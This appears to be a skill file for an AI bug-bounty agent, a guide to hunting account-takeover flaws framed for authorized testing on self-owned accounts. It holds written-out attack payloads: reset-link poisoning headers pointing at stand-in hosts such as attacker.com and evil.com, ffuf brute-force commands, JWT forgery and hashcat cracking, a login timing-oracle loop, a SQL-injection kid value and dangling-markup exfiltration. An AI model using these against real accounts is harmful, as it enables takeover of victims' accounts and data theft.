---
name: account-takeover
description: >-
  Hunt account takeover taxonomy — 9 distinct paths to ATO, plus chains. Paths: (1) password reset flaws
  (host-header injection redirects token, predictable/numeric token, Referer leak, no-expiry/reuse), (2)
  email change without re-auth, (3) OAuth account-link CSRF, (4) MFA bypass (per mfa-and-passwords), (5)
  session fixation, (6) JWT manipulation (forge token to another identity; crypto details → crypto-and-secrets), (7) password change without step-up (chain with login timing/length oracle), (8) social-recovery
  / security-question brute-force, (9) SSO subdomain takeover at OAuth redirect_uri. Chains: cookie theft +
  password oracle + no step-up = persistent ATO; lax redirect_uri = auth-code theft; dangling-CNAME takeover
  at redirect_uri = ATO. Validate: demonstrate real takeover of test account B from attacker A's session;
  OOB/Collaborator confirm blind token-leak steps. Use when hunting ATO chains, testing password reset /
  email change / MFA / OAuth / session / JWT, or chaining primitives toward Critical. Combined with the
  HackerOne field guide (real disclosed-report data: where it pays, quick wins, payload banks). Hunt account
  takeover chains. Use when combining auth, reset, OAuth, XSS, IDOR, or logic bugs into full account
  compromise. Backed by 262 disclosed HackerOne reports.
---

# Account Takeover — Combined Field Guide

**Merged skill.** This fuses two complementary sources into one reference:

- **Part 1 — HackerOne field guide:** statistics from disclosed reports, "where it pays," quick wins, and curated payload banks.
- **Part 2 — Bug hunter methodology:** autonomous testing priority, canary discipline, crown-jewel targeting, OOB/validation gates, and reporting guidance.

**How to use:** Open with Part 2 for execution discipline (set your canary, know your success/failure gate). Use Part 1 to prioritize targets and pull payloads. Before reporting, run the validation gates in both parts.

---

<!-- ============ PART 1: HACKERONE FIELD GUIDE (data + payloads) ============ -->

# Account Takeover — HackerOne field guide

Built from **262** publicly disclosed HackerOne reports (2014–2026). Corpus: `~/.local/share/hackerone-reports/`.

**Reference files (load on demand):**

- `references/payloads.md` — payload banks, probes, wordlists, Nuclei templates, observed parameters
- `references/techniques.md` — quick wins, bypasses, real-report techniques, deeper checklists

## Signal

- Reports: **262** · paid: **39**
- Median bounty **$1,500** · p90 **$10,500** · max **$35,000** · total **$144,138**
- Median upvotes **36**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitLab | 2 | $37,450 | 1088 |
| HackerOne | 6 | $22,500 | 2145 |
| Uber | 6 | $21,000 | 787 |
| Mail.ru | 27 | $14,550 | 1730 |
| TikTok | 4 | $12,000 | 724 |
| Superhuman (formerly Grammarly) | 3 | $10,500 | 628 |
| Chaturbate | 2 | $8,000 | 67 |
| LY Corporation | 2 | $5,000 | 708 |

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`reset` `email` `verify` `oauth` `link` `otp` `mfa` `session`

## Tools

`Burp` · `Turbo Intruder` · `interactsh`

## Escalation chains

- Reset poisoning -> ATO.
- XSS -> cookie theft -> ATO.
- OAuth link -> ATO.

## Related

- `auth-bypass` (989 reports)
- `oauth-oidc` (177 reports)
- `xss` (2,569 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

## 13. ATO — ACCOUNT TAKEOVER TAXONOMY
> 9 distinct paths. ATO is a destination class, not a single bug — each path below is a primitive that becomes Critical only when you demonstrate takeover of a SECOND account (test account B) you do not control, from attacker A's session/IP/device. A path that only locks you out of your own account, or only works when you already hold the victim's password AND session, is not a standalone ATO.

### Path 1: Password Reset Poisoning (Host-Header)
```bash
POST /forgot-password HTTP/1.1
Host: attacker.com                 # primary Host swap
# OR keep real Host and add one of:
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
# OR dual-Host smuggling:  Host: target.com\r\nHost: attacker.com

email=victimB@company.com
```
The reset mailer builds the link from the request Host header → link points to `attacker.com/reset?token=XXXX`. **Confirmation = OOB, not response-based:** point the header at a Burp Collaborator / unique DNS name and read the actual email (use a controlled victim B inbox you own for the test). If the token only appears in the email body that lands at your Collaborator host, you have proof.
**False-positive killer:** many apps put `attacker.com` in the email but the actual link domain is server-pinned — read the email, do not infer from the reflected header.

### Path 2: Reset Token in Referer / Open-Redirect Leak
```
GET /reset-password?token=ABC123
→ page loads third-party resource: <script src="https://analytics.com/t.js">
→ browser sends  Referer: https://target.com/reset-password?token=ABC123
→ token exfiltrated to every off-origin host the page calls
```
Also test reset pages that 302 to an open redirect carrying the token in the URL. **Proof:** capture the outbound request in the Network tab (or Collaborator if you control the off-origin host) showing the full token in the Referer. Mitigated by `Referrer-Policy: no-referrer` + tokens in POST body — note their absence.

### Path 3: Predictable / Weak Reset Tokens
```bash
# 6-digit numeric OTP-style reset code, no rate limit:
ffuf -u "https://target.com/api/reset/verify" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"victimB@company.com","code":"FUZZ"}' \
  -w <(seq -w 000000 999999) -mc 200 -fr "invalid" -t 5
# time-based tokens: capture 5 tokens, diff — md5(timestamp)/sequential int = predictable
```
**Discipline:** request the victim-B token yourself (you own B), confirm entropy by sampling, THEN show a fresh brute lands. A rate-limit-only finding on `/forgot-password` is routinely rejected — the impact is token guessing, not request flooding.

### Path 4: Token No-Expiry / Reuse / Cross-Account
```
Expiry:  request token → wait 2h → still valid? = bug
Reuse:   use token once → use again → still valid? = bug
Multi:   request token#1, then token#2 → is token#1 still valid? (should be invalidated)
Cross:   does B's token reset A's password if you swap the userid/email param? = IDOR-in-reset
```

### Path 5: Email Change Without Re-Auth
```bash
PUT /api/user/email HTTP/1.1
Cookie: session=ATTACKER_A_SESSION
{"new_email":"attacker@evil.com"}     # no current_password, no OTP, no email-confirm
```
If the change takes effect with no current-password challenge and no confirm-link to the OLD address, trigger password reset → reset lands at attacker mailbox → ATO. The strongest variant skips even the new-address confirmation. Branded pattern: account-link / email-change → ATO via missing re-auth.

### Path 6: JWT Manipulation
```bash
# (a) alg:none — strip the signature, set header alg to none
python3 -c "import jwt; print(jwt.encode({'sub':'victimB','role':'admin'}, key='', algorithm='none'))"
# send: header {"alg":"none","typ":"JWT"}, payload {"sub":"victimB"}, empty signature
#
# (b) RS256 -> HS256 key confusion: re-sign with the server's PUBLIC key as the HMAC secret
curl -s https://target.com/.well-known/jwks.json   # or /oauth/.well-known/...  grab the RSA pub key
# convert JWK -> PEM, then sign HS256 using that PEM bytes as the secret -> server verifies it
#
# (c) weak HMAC secret: crack offline
hashcat -a 0 -m 16500 token.jwt rockyou.txt   # -m 16500 = JWT
#
# (d) kid injection: kid=../../../dev/null (empty key) or kid=' UNION SELECT 'secret -- (SQL-backed kid)
```
**Verified grounding for this class:** [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235) (node `jsonwebtoken` <4.2.2 — alg confusion / none bypass), [CVE-2016-10555](https://nvd.nist.gov/vuln/detail/CVE-2016-10555) (`jwt-simple` RS256→HS256). **Validate:** forged token must reach a privileged endpoint as victim B (e.g. `GET /api/admin` or `/api/users/B`) — decoding/forging is not impact; an authorized action under B's identity is. If the server ignores the forged `sub` and keys off the session cookie, the JWT is not the trust boundary — no finding.

### Path 7: Password Change Without Step-Up + Login Oracle
```bash
# (a) password-change endpoint accepts a new password with no current-password / no MFA challenge:
POST /api/account/password
Cookie: session=STOLEN_B_COOKIE        # from XSS, session-fixation, or token leak
{"new_password":"Pwned#2026"}          # no "current_password" field
#
# (b) login oracle to find a valid password without an existing cookie — measure response delta:
for p in $(cat candidates.txt); do
  t=$(curl -s -o /dev/null -w '%{time_total}' -d "user=victimB&pass=$p" https://target.com/login)
  printf '%s\t%s\n' "$t" "$p"
done | sort -n     # bcrypt-vs-fast-reject timing gap, or response-length diff, leaks valid pass
```
A no-step-up password-change endpoint is the **persistence multiplier**: cookie theft (transient) + this = attacker sets a new password from the stolen cookie → owns B from any device/IP, victim locked out. **False-positive check:** confirm there is genuinely no current-password / MFA gate — many APIs accept the field as optional but still 403 server-side; replay without the field and read the actual state change (try logging in with the new password from a clean browser).

### Path 8: Social-Recovery / Security-Question Abuse
```bash
# Security answers are low-entropy and often unthrottled. Brute the recovery-answer endpoint:
ffuf -u "https://target.com/account/recover/answer" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"victimB@company.com","question":"pet","answer":"FUZZ"}' \
  -w common-answers.txt -mc 200 -fr "incorrect" -t 5
# also test: answers returned/echoed in /api/me or recovery page source (client-side check)
# and: question itself reveals PII the answer to which is OSINT-able (mother maiden, first school)
```
Pair with `offensive-osint`: many "secret" answers (birth city, pet, school) are public on social profiles → no brute needed. **Validate** by completing the recovery flow end-to-end into a session on account B.

### Path 9: SSO Subdomain Takeover at OAuth redirect_uri
```bash
# (a) enumerate accepted redirect_uri patterns — does the provider accept *.target.com subdomains?
GET /oauth/authorize?client_id=...&redirect_uri=https://anything.target.com/cb&response_type=code
# (b) find a dangling subdomain (CNAME -> deprovisioned Heroku/S3/Azure/GH-Pages) via subdomain-takeover:
dig +short staging.target.com    # CNAME -> nonexistent-app.herokuapp.com  (NXDOMAIN on the target)
# (c) claim that host on the cloud provider, serve a callback that logs the ?code=
# (d) send victim B the crafted authorize URL -> their code/token lands on your claimed subdomain
```
**Confirmation = OOB:** the auth `code` (or implicit `access_token`) must actually arrive at the host you claimed — log it server-side and exchange it for B's token. A redirect_uri that merely *reflects* an off-origin value but bounces the code through a server-pinned exchange is not exploitable. Decode any error body as JSON, not substring — `AADSTS50076` / claims-challenge responses contain a literal `access_token` substring inside the claims field that is NOT a usable token.

### Path 10: Pre-Account / Unverified-Account Takeover
The victim's account exists in a pending/unverified state (invite not accepted, signup email never confirmed, or no email on file). Claim it first: register or attach your controlled email to that identity, then let the victim complete SSO/OTP login and inherit the attacker-seeded state — or trigger a reset once your email is attached. Test invite/pending flows and any endpoint that writes an email to an account lacking a confirmed one; confirm the victim, after signing in, lands in the account you seeded. High impact, no token interaction. Disclosed: reports/1679734, reports/394329.

### Path 11: Passwordless / Magic-Link Abuse by Identifier
A passwordless-signup / magic-login / OTP-login endpoint that sets or resets a password (or issues a session) given only an enumerable identifier (phone/email), with no token step. Probe `*passwordless*`, `*magic*`, `*/otp-login`, `*/signup`: does supplying only a phone/email set the password or return a session for that identity? Enumerate identifiers to prove arbitrary-account reach; validate by taking test account B via its number alone. Disclosed: reports/143717.

### ATO Severity Gate
- **Critical** — zero/low victim interaction: Host-header reset poisoning, JWT forgery to victim endpoint, lax-redirect_uri auth-code theft, IDOR-driven email change → reset.
- **High** — one email click OR a pre-existing session/cookie required (Referer leak, no-step-up password change behind cookie theft).
- **Medium** — requires phishing + active user interaction (OAuth-link CSRF needing the victim to click + be logged in).
- **Low** — attacker must be MitM, or only self-account impact.

---

## Related Skills & Chains

- **`idor`** — The most reliable ATO primitive that needs no email control and no race. Chain primitive: `PATCH /api/users/{victimB_uid}` with attacker-A session + victim UID + `{"email":"attacker@evil.com"}` → trigger password reset → reset email arrives at attacker → full ATO, zero victim interaction (Path 5 + IDOR = Critical).
- **`mfa-and-passwords`** — Path 7 is only Critical if it also bypasses MFA. Chain primitive: password-change endpoint accepts a new password with no current-password challenge AND no MFA step-up → cookie theft (XSS / token leak) + login timing oracle → set new password from the stolen cookie → MFA-less ATO from any IP/device.
- **`oauth-oidc`** — Path 9 lives here. Chain primitive: `redirect_uri` validation accepts subdomain match (`*.target.com`) + `subdomain-takeover` reveals a dangling CNAME on `staging.target.com` → claim it on Heroku/S3 → host an OAuth callback → victim clicks the crafted authorize URL → code lands on the attacker subdomain → exchange for token → ATO. Always JSON-parse OAuth error bodies; never substring-match `access_token`.
- **`api-misconfig`** — Path 6 (JWT) detail lives here too: alg:none, RS256→HS256 key confusion (sign with the JWKS public key as the HMAC secret), `kid` path-traversal / SQLi, and weak-secret cracking (`hashcat -m 16500`). Load it together with this skill for the JWK→PEM conversion mechanics.
- **`host-header`** — Path 1 canonical primitive. Chain primitive: `POST /forgot-password` with `Host`/`X-Forwarded-Host: attacker.com` → mailer builds the link from the request Host → link points to `attacker.com/reset?token=XXXX` → victim clicks → token leaked → ATO. Confirm via Collaborator-hosted domain reading the real email, not the reflected header.
- **`offensive-osint`** — Path 8 force-multiplier: most security-question answers (birth city, pet, first school, mother's maiden name) are OSINT-able from social profiles → recover account B with no brute force at all.
- **`security-arsenal`** — Pull the Password-Reset Bypass Tables (`X-Forwarded-Host`, `X-Host`, `X-HTTP-Host-Override`, dual-Host smuggling), token-entropy payloads (sequential numeric, time-based predictable), the JWT attack table, and the always-rejected list for "rate-limit on /forgot-password" reports.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an ATO that needs the victim to click a link AND enter credentials AND pass CAPTCHA. The reproducibility step (10-minute fresh-browser walkthrough taking over test account B from attacker A's session) separates Critical-paid from Self-XSS-tier rejected.

## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete places, params, headers, flows to look

- Enumerate every recovery path, not just `/forgot-password`: `/reset-password`, `/password/reset`, `/api/public/passwords/`, `/change-email`, `/verify-email`, `/confirm`, `/activate`, `/magic-link`. The 2025 Beek Labs case ($3,000, 1.3M users) found a forgotten reset API only by reversing references out of the JS bundle — grep bundles for `reset_password`, `token`, `authenticationToken`, `pin`, `jobId`.
- For each reset request, record which values build the absolute link. Probe `Host`, `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded`, and dual `Host` headers. PortSwigger's canonical lab uses `X-Forwarded-Host: YOUR-ID.exploit-server.net` on `POST /forgot-password`.
- Identify the token carrier: query param (`temp-forgot-password-token`, `reset_password_token`), body field, cookie, or fragment. Note whether the token is also echoed in the JSON response body — Beek Labs saw full PII + reset token + session token in a `201 Created`.
- Look for client-controlled URL parameters in the reset call: `reset_password_path`, `redirect_url`, `base_uri`, `callback`, `return_to`. A user-controlled `reset_password_path` is an independent poisoning primitive even when Host is pinned (CVE-style "absolute URL link poisoning").
- Map the whole state machine: request → email → token validation → form submit → token destruction. Check each hop for binding: is the token tied to an account, a session, an IP, a timestamp?
- Check "remember me" cookies for predictable concatenation of username + timestamp (PortSwigger). Decode Base64/JSON; look for `user|timestamp`, `md5(username+password)`, unsalted hashes that can be brute-forced offline.
- Secondary surfaces: hidden `username`/`email` fields in the password-change POST, account-linking endpoints, email-change confirmation links, security-question answers (OSINT-able), and stale links issued before a password change or 2FA enable.
- Note whether tokens are timestamp-derived (PortSwigger "Time-sensitive attacks") — two resets for two users at the same timestamp can yield the same token.

- Check whether link-building uses a template engine or framework helper that reads a configurable base URL (`application_url`, `APP_URL`, `SITE_URL`, `base_url`, `frontend_url`); if that config can be influenced via a parameter or a hosted config file, the link is poisonable even with a correct Host.
- Note the exact email HTML renderer: PortSwigger's dangling-markup lab sanitizes with DOMPurify for the rendered view but leaves the "view as raw HTML" path unsanitized — test both views, since the raw path is the exploitable sink.
- Capture whether the reset request itself requires authentication. An unauthenticated reset that accepts an arbitrary email/username is the precondition for both poisoning and 0-click parameter swap.
- Record every response field from the reset request (JSON keys, status, `Set-Cookie`, `Location`) — a mismatched `201` that returns a full user object is a strong signal of a debug/legacy endpoint.
- Check the token's binding surface: compare a token requested via Chrome vs Firefox, different IP, different User-Agent, and a different session; an unbound token is reusable across all of them.
- Look at the password-change POST for a hidden or predictable `user_id`/`uid` next to `email` — swapping both is often required when `email` alone is validated.
- Inventory email-change confirmation links: the classic pattern is attacker requests change to their own address, sends the confirmation link to the victim, and the victim's click binds the victim account to the attacker's email, enabling a later password reset.
- Check whether a password reset invalidates existing sessions. A token that changes the password but leaves the victim's live session untouched may not yield a usable ATO — record this during validation.
- For financial targets, check whether the same reset/session token is accepted by the withdrawal or payout API — this determines whether the impact is account access alone or direct fund movement (Beek Labs: $3,000 bounty, finance platform).

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Basic poisoning: `POST /forgot-password` with `username=carlos` and `Host: attacker.net` (or `X-Forwarded-Host: attacker.net`) → read the stolen `temp-forgot-password-token` from the attacker access log → replay on the *real* domain reset URL.
- Header bypass matrix from a 2025 €900 0-click writeup: `X-Forwarded-Host`; inverted Host pair (`Host: evil.com` + `X-Forwarded-Host: redacted.com`); `X-Forwarded-For` swap/flip; `Host: evil.com.redacted.com`; `Host: redacted.com.evil.com`; absolute-form target `POST / https://endpoint/ HTTP/1.1` with `Host: http://evil.com` to get 200/302 where plain form gave 403/404.
- Broken-logic variant: request your own reset, open the form, then in `POST /forgot-password?temp-forgot-password-token=...` delete the token value from both URL and body and set `username=carlos` — if the app still resets, the token is never revalidated at submit time.
- 0-click email-parameter swap: intercept the final password-change POST, change only the `email` field attacker → victim; a trailing opaque "authenticity" param may be decorative. A `200 {"status":true}` plus successful victim login confirms it.
- Dangling-markup injection when the Host is numeric-only validated but an arbitrary port is accepted: `Host: target.net:'<a href="//attacker.net/?` breaks out of a single-quoted string in the email HTML and exfiltrates the rest (including the new password) via `GET /?...` when the mail renderer/AV scanner fetches the link (PortSwigger dangling-markup lab).
- Response-body token exposure: reconstruct a hidden API call from JS, then `POST /api/public/passwords/ {"reset_password_path":"https://evil.com/","email":"victim@..."}` and read `authenticationToken`/reset token straight from the JSON — three independent takeover vectors from one endpoint.
- CVE-2025-29036 style: when `application_url` is unset, Kanboard builds reset links from `SERVER_NAME` (Host-derived); `Host: myevilsite.com` yields `http://myevilsite.com/forgot-password/change/<token>`. Patched in 1.2.46.
- Token entropy/time attacks: collect 10+ tokens for your own account and check sequentiality; try two parallel resets for two users to collide a timestamp-seeded token (predict → probe → prove with single-packet HTTP/2).
- Race the final state: parallelize "issue reset" and "consume reset" so the session ends with the victim's user ID but the attacker's token (PortSwigger single-endpoint race pattern).

- Predictable-token variant without poisoning: if the reset URL is `?user=victim-user` rather than a token, change the username directly to reach the reset form (PortSwigger "Resetting passwords using a URL"). Combine with a hidden `username` field in the submit POST.
- Token-not-revalidated + token-reuse: after a successful reset, replay the same token a second time. If it still works, the token is neither single-use nor destroyed — a distinct finding from broken submit-time binding.
- Mailer host injection via `X-Forwarded-Host` behind a reverse proxy: the origin sees the correct `Host`, but the framework builds absolute URLs from the forwarded header. Test both headers *independently* and together; record which one the mailer trusted.
- Inverted-Host trick: `Host: evil.com` with `X-Forwarded-Host: redacted.com` sometimes passes proxy validation while the app still uses the attacker's `Host` for link generation — try all four permutations of the two headers.
- Absolute-form request line bypass: `POST https://target.net/forgot-password HTTP/1.1` with `Host: attacker.net` can slip past naive path/Host checks that reject the normal origin-form request (2025 €900 writeup).
- Parameter-pollution on the reset body: `email=victim@x&email=attacker@x` — different parsers (WAF vs app) may select different values, producing a token generated for one address and delivered to another.
- Stale-link chain with MFA: keep a reset link issued before the victim enables 2FA; after they enable it, replay the link — if it logs straight into the dashboard without an MFA challenge, this is an ATO that defeats the added factor (see MFA skill).
- Session-token leak chain: if the reset API returns `authenticationToken`, skip the password step entirely — replay the token as `X-User-Token` / `Authorization` against `/api/me` and a write endpoint to prove authenticated access without ever changing the password.
- Mass-verification across roles: repeat the chain against a test instructor and a test admin account to show the impact is privilege-independent (XHack case study) — this strengthens severity without touching real users.

### C. Validation / proof bar — how to confirm and avoid false positives

- Reflected header ≠ stolen token. Require an actual token-bearing request arriving at your Collaborator/exploit-server log (`GET /reset?token=...`), then prove the token works on the canonical domain by completing the reset and logging in.
- Always use two self-controlled accounts (A attacker, B victim): start from A, end with a live authenticated session as B. Never target real users.
- Distinguish "token leaked" from "token reusable": a stolen token that is single-use or bound to IP/UA/session may die — confirm the reset completes end-to-end, not just that the email URL changed.
- For response-body leaks, show the exact JSON keys and a clean login as the victim; PII exposure alone is a separate finding, not automatically ATO.
- Beware AV-link-scanner false positives: a click inside an email client is not real victim interaction unless the app's own mail renderer fetches it; document who fetched the poisoned URL.
- Header-injection-only "the email contained evil.com" with a 403/404 or dead link is Informational. Tokens should expire quickly and be destroyed immediately after use; a token that still works later strengthens the finding.
- Severity gate: 0-click (parameter swap only) = Critical; 1-click poisoning with a real token captured and reset completed = Critical; enumeration-only or unbound-link-only = Low/Informational. Redact session cookies and other-user PII in the PoC.

- Confirm the stolen token is actually associated with the victim, not your own: the Collaborator request should carry the token from a reset requested *for the victim's username*, and the resulting login should be the victim account.
- If the email client itself fetches remote links (AV scanners, image proxies), document that the token arrived without a human click; this is a legitimate 0-click interaction in most bug-bounty threat models but should be stated explicitly.
- For parameter swap, show the pre-change and post-change request side by side with only the `email`/`username` field differing — reviewers reject reports where other fields changed and the root cause is ambiguous.
- Verify the fix surface: after the program patches `Host` handling, re-test `X-Forwarded-Host` and the absolute-form request line separately — partial fixes are common (XHack retest confirmed both).
- Do not claim ATO from a leaked reset token if the token is bound to the victim's session/UA/IP and cannot be replayed from your browser — the binding check is part of the proof, not a mitigating detail to ignore.
- Check the token's TTL: a link that expires in minutes narrows the exploit window but does not invalidate the finding; a link that never expires is an independent issue worth noting.
- When the hidden endpoint returns PII, file the token exposure and the PII disclosure as separate impacts in the same report, but only claim ATO where a login as the victim is demonstrated.
- Preserve the raw reset email, exact request headers, and the attacker access-log entry; redact other users' names/emails/phones and all session cookies per evidence hygiene.
- Severity floor: password reset token exposure in the response body with no victim interaction = High to Critical; a poisoned link requiring a click but yielding a working token = High/Critical; a poisoned link with a dead or already-consumed token = Informational.

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning
2. https://blog.beeklabs.com/undocumented-password-reset-account-takeover/
3. https://portswigger.net/web-security/authentication/other-mechanisms
4. https://portswigger.net/web-security/race-conditions
